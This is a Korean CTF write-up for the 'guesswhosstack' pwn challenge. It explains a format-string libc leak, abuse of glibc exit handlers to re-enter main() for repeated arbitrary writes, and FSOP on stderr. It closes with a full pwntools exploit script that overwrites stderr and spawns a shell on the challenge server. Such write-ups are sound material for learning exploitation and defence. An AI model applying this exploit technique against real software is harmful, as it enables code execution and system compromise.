# guesswhosstack

### 보호 기법

![images/image.png](images/image%204.png)

### 코드 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int  main() {
    setbuf(stdout, NULL);
    char first_shot[5];
    long s1, d1, d2, s2;
    puts("The prophet Eminem famously said you only have one shot, one opportunity.");
    printf("First shot...");
    scanf("%5s", first_shot);
    printf("\nPalms are sweaty, knees weak, arms are heavy "); 
    printf(first_shot);
    printf("\n");

    printf("He opens his mouth but the words don't come out... ");
    scanf("%ld %ld", &s1, &d1);
    printf("\nHe's chokin how, everbody's jokin now... ");
    scanf("%ld %ld", &s2, &d2);
    
    *(long *) s1 = d1;
    *(long *) s2 = d2;
    
    printf("Clock's run out, time's up, over, blaow");
    exit(0);
}

```

코드 자체는 간단하다.

5bytes 크기의 `printf()`를 통한 FSB가 발생하고, 이후 2번의 AAW가 발생한다.

### libc leak

이후 과정이 복잡하기에, 간단하게 설명만 하고 넘어간다.

FSB를 이용할 때 stack의 13번째 인자를 통해 libc leak을 진행하면 된다.

필요한 printf() 함수의 호출 형식은 다음과 같다.

```c
printf("%13$p");
```

### __cxa_atexit()

먼저 `__cxa_atexit()` 함수에 대해 설명한다.

```c
int
__cxa_atexit (void (*func) (void *), void *arg, void *d)
{
  return __internal_atexit (func, arg, d, &__exit_funcs);
}

int
attribute_hidden
__internal_atexit (void (*func) (void *), void *arg, void *d,
		   struct exit_function_list **listp)
{
  struct exit_function *new;

  /* As a QoI issue we detect NULL early with an assertion instead
     of a SIGSEGV at program exit when the handler is run (bug 20544).  */
  assert (func != NULL);

  __libc_lock_lock (__exit_funcs_lock);
  new = __new_exitfn (listp);

  if (new == NULL)
    {
      __libc_lock_unlock (__exit_funcs_lock);
      return -1;
    }

  PTR_MANGLE (func);
  new->func.cxa.fn = (void (*) (void *, int)) func;
  new->func.cxa.arg = arg;
  new->func.cxa.dso_handle = d;
  new->flavor = ef_cxa;
  __libc_lock_unlock (__exit_funcs_lock);
  return 0;
}
```

프로그램 시작 시, `_dl_fini()`함수를 인자로 하여 `__cxa_atexit()` 가 호출된다.

이 과정을 통해 `struct exit_function_list`에 존재하던 `initial`객체에 `_dl_fini()`가 등록된다.

참고로 추가적인 다른 함수들이 등록되지 않았다면, `initial->idx` 에는 1이, `initial->fns[0]`의 flavor 값으로는 `ef_cxa`가, 함수로는 `_dl_fini()`가 저장된다.

### exit()

다음으로는 `exit()`의 동작에 대해 설명한다.

`exit()` 함수는 `__run_exit_handlers()` 함수를 호출한다.

### __run_exit_handlers()

```c
void
attribute_hidden
__run_exit_handlers (int status, struct exit_function_list **listp,
		     bool run_list_atexit, bool run_dtors)
{
	...
  while (true)
    {
      struct exit_function_list *cur;

    restart:
      cur = *listp;
      
      ...

      while (cur->idx > 0)
				{
				  struct exit_function *const f = &cur->fns[--cur->idx];
				  const uint64_t new_exitfn_called = __new_exitfn_called;
			
				  switch (f->flavor)
				    {
				      void (*atfct) (void);
				      void (*onfct) (int status, void *arg);
				      void (*cxafct) (void *arg, int status);
				      void *arg;
			
				    case ef_free:
				    case ef_us:
				      break;
				    case ef_on:
				      onfct = f->func.on.fn;
				      arg = f->func.on.arg;
				      PTR_DEMANGLE (onfct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      onfct (status, arg);
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
				    case ef_at:
				      atfct = f->func.at;
				      PTR_DEMANGLE (atfct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      atfct ();
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
				    case ef_cxa:
				      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
					 we must mark this function as ef_free.  */
				      f->flavor = ef_free;
				      cxafct = f->func.cxa.fn;
				      arg = f->func.cxa.arg;
				      PTR_DEMANGLE (cxafct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      cxafct (arg, status);
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
				    }
  ...
}
```

list를 순회하며 등록된 함수가 있다면 호출하는 방식으로 동작한다.

프로그램 시작 시 등록했던 `_dl_fini()`함수가 switch 문의 `ef_cxa`  case를 통해 호출되고, `_dl_fini()`함수는 내부적으로 `_dl_call_fini()` 함수를 호출하게 된다.

### _dl_call_fini()

```c
# define DL_CALL_DT_FINI(map, start) ((fini_t) (start)) ()

void
_dl_call_fini (void *closure_map)
{
  struct link_map *map = closure_map;
	...
  /* Next try the old-style destructor.  */
  ElfW(Dyn) *fini = map->l_info[DT_FINI];
  if (fini != NULL)
    DL_CALL_DT_FINI (map, ((void *) map->l_addr + fini->d_un.d_ptr));
}
```

만약 `fini`가 NULL이 아닐 경우, `map->l_addr + fini->d_un.d_ptr` 값으로 jump하게 된다.

참고로 `map->l_addr` 값은 PIE base 주소에 해당하므로, `fini->d_un.d_ptr` 값에 `main()` 함수의 offset을 집어넣게 되면 다시 `main()`함수가 호출된다.

여기서 주의할 점은, 첫 `_dl_call_fini()`의 경우 `fini` 는 read-only 영역에 존재하기 때문에 `fini->d_un.d_ptr`를 바로 수정할 수 없다. `map`의 경우 writable하므로  `map->l_info[DT_FINI]`값을 writable address로 수정하고, 그 주소를 기준으로 `d_un.d_ptr` 를 수정하면 된다.

즉, 이 부분에서 2번의 AAW가 필요하다.

`main()` 종료 후 다시 `exit()`이 호출되므로, 이미 변경된 `fini->d_un.d_ptr` 값에 의해 `main()`을 반복하여 호출할 수 있게 되고, 결국 AAW를 원하는 만큼 진행할 수 있다.

하지만 `__run_exit_handlers()`를 다시 보면 다음의 2가지 문제점이 존재한다.

```c
      while (cur->idx > 0)
				{
				  struct exit_function *const f = &cur->fns[--cur->idx];
				  ...
				}
```

1. `idx > 0`인 경우에만 while문이 실행되고, 그 과정에서 `idx`값을 줄인다.
    
    ⇒ 다음 `__run_exit_handlers()` 호출 시 while 문에 들어가지 않게 된다.
    

```c
				    case ef_free:
				    case ef_us:
				      break;
				    case ef_cxa:
				      /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
					 we must mark this function as ef_free.  */
				      f->flavor = ef_free;
				      cxafct = f->func.cxa.fn;
				      arg = f->func.cxa.arg;
				      PTR_DEMANGLE (cxafct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      cxafct (arg, status);
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
```

2. `flavor` 값이 `ef_cxa`인 경우 `flavor`를 `ef_free`로 수정한다.
    
    ⇒ `ef_free`는 함수를 호출하지 않는 case에 해당하므로, 다음 `__run_exit_handlers()` 호출 시 아무런 동작을 하지 않고 switch문이 종료된다.
    

그렇기 때문에 2번째 `main()` 호출 시 AAW를 사용하여 idx와 flavor 값을 수정해야 3번째 `main()` 이 성공적으로 호출된다.

하지만 한 번의 `main()` 호출 당 2번의 AAW가 가능하므로, 사실상 `main()` 함수의 반복호출 이외의 목적으로 AAW를 사용할 수 없게 된다.

코드를 다시 보면, 

```c
				    case ef_on:
				      onfct = f->func.on.fn;
				      arg = f->func.on.arg;
				      PTR_DEMANGLE (onfct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      onfct (status, arg);
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
				    case ef_at:
				      atfct = f->func.at;
				      PTR_DEMANGLE (atfct);
			
				      /* Unlock the list while we call a foreign function.  */
				      __libc_lock_unlock (__exit_funcs_lock);
				      atfct ();
				      __libc_lock_lock (__exit_funcs_lock);
				      break;
```

`ef_on`과 `ef_at`의 경우에는 `flavor`의 값을 수정하지 않고 등록된 함수를 호출하는 역할을 한다.

그렇기 때문에 2번째 `main()` 에서의 AAW를 통해 `idx`값을 1, `flavor` 값을 `ef_on` 혹은 `ef_at` 으로 수정하게 된다면, 3번째 `main()` 부터는 `idx`값만 1로 수정하면 `main()`을 계속 호출할 수 있게 된다.

즉, 3번째 `main()`부터 AAW를 1번씩 추가로 진행할 수 있는 것이다.

정리하면 다음과 같다.

- 1st main()
    
    AAW1: `map->l_info[DT_FINI]` 값을 writable address로 수정
    
    AAW2: 수정한 writable address기준, `d_un.d_ptr`에 해당하는 주소에 `main()` offset 값을 write한다.
    
- 2nd main()
    
    AAW1: `initial->idx` 값을 1로 수정한다.
    
    AAW2: `initial->fns[0]` entry의 `flavor` 값을 `ef_on` 혹은 `ef_at` 으로 수정한다.
    
- 3rd main() — final
    
    AAW1: `initial->idx` 값을 1로 수정한다.
    
    AAW2: 원하는 주소의 값을 수정
    

### FSOP

3rd main()부터 `stderr`를 덮어서 FSOP를 준비한다.

마지막 main()에서는 `initial->idx`값을 수정하지만 않으면 알아서 `_IO_flush()`가 호출되어 성공적으로 exploit을 할 수 있다.

### 익스플로잇 코드

```python
from pwn import *

# r = process("./chal_patched")
# r = remote("127.0.0.1", 31337)
r = remote("guess-who-stack.harkonnen.b01lersc.tf", 8443, ssl=True)

def AAW2(addr1, val1, addr2, val2):
    r.sendlineafter(b"come out... ", str(addr1).encode() + b" " + str(val1).encode())
    r.sendlineafter(b"jokin now... ", str(addr2).encode() + b" " + str(val2).encode())
    
r.sendlineafter(b"First shot...", b"%13$p")
r.recvuntil(b"heavy ")

libc_base = int(r.recvline()[:-1], 16) - 0x28150
ld_base = libc_base + 0x211000
r.success(f"libc base: {hex(libc_base)}")
r.success(f"ld base: {hex(ld_base)}")

### 1st main() ###
# overwrite map->l_info[DT_FINI]
# such that map->l_addr + fini->d_un.d_ptr = main
AAW2(ld_base + 0x38378, libc_base + 0x1ff690, libc_base + 0x1ff698, 0x11e9)

### 2nd main() ###
r.sendlineafter(b"First shot...", b"AAAAA")

initial = libc_base + 0x2001a0

# initial->idx = 1, initial->fns[0].flavor = ef_at
AAW2(initial + 0x8, 1, initial + 0x10, 3)

### 3rd main() ###
stderr = libc_base + 0x1ff6c0

payload = b"\x01\x01\x01\x01;sh;"
payload += p64(0) * 4
payload += p64(1)
payload += p64(0) * 7
payload += p64(libc_base + 0x552b0) # system
payload += p64(0) * 3
payload += p64(libc_base + 0x1fecf0)
payload += p64(0) * 2
payload += p64(stderr - 0x10)
payload += p64(0) * 5
payload += p64(stderr)
payload += p64(libc_base + 0x1fd468) # _IO_wfile_jumps

### FSOP start ###
for i in range(0, len(payload), 8):
    r.sendlineafter(b"First shot...", b"AAAAA")
    # initial->idx = 1, FSOP
    AAW2(initial + 0x8, 1, stderr + i, u64(payload[i:i+8]))

### finish main() loop ###
r.sendlineafter(b"First shot...", b"AAAAA")
AAW2(initial + 0x8, 0, initial + 0x8, 0)

r.interactive()
```